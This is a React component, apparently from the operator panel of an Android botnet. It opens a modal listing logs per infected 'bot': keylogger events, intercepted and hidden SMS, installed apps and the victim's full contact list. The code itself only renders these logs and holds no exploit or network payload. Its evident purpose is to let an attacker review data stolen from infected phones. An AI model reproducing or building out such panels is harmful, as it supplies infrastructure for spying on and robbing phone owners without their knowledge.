import React from 'react';
import SettingsContext from '../../Settings';
import { try_eval } from '../../serviceF';
import AllLogsPage from '../../pages/Logs/AllLogsPage';

class LogsModal extends React.Component {
    
    constructor(props)
    {
        super(props);
        this.state = {
            myObjJS: null,
            BotID: SettingsContext.CurrentSetBot,
            CurrentLogType: SettingsContext.CurrentLogType
        };
    }

    UpdateLogsModal() {
        this.forceUpdate();
    }

    componentWillReceiveProps() {
        this.setState({
            CurrentLogType: SettingsContext.CurrentLogType
        })
        this.forceUpdate();
        //this.onLoadJson();
    }

    CloseModal() {
        SettingsContext.CurrentLogType = '';
        try_eval('$("#LogsInfoModal").modal("hide");');
    }
    

    render () {
        let TitleMODAL = 'NONE';
        switch(SettingsContext.CurrentLogType) {
            case 'getLogsSMS':
                TitleMODAL =  'All SMS\\Events and etc logs';
                break;
            case 'getLogsKeylogger':
                TitleMODAL =  'Keylogger events';
                break;
            case 'getLogsBotsSmsSaved':
                TitleMODAL =  'Saved SMS on phone (not hide sms)';
                break;
            case 'getlogsListApplications':
                TitleMODAL =  'Installed apps list';
                break;
            case 'getlogsPhoneNumber':
                TitleMODAL =  'All phone contacts';
                break;
            default:
                break;
        }
        return (
            //<!-- Modal -->
            <div className="modal fade bd-example-modal-lg" id="LogsInfoModal" tabIndex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
            <div className="modal-dialog modal-dialog-centered modal-lg" role="document" style={({maxWidth:'90%'})}>
                <div className="modal-content">
                <div className="modal-header">
                    <h5 className="modal-title" id="exampleModalLongTitle">{TitleMODAL}</h5>
                    <button type="button" className="close" data-dismiss="modal" aria-label="Close" onClick={this.CloseModal.bind(this)}>
                    <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div className="modal-body">
                    <AllLogsPage UpdateLogsModal={this.UpdateLogsModal} dataurl={SettingsContext.CurrentLogType}/>
                </div>
                </div>
            </div>
            </div>
        );
    }
}

export default LogsModal;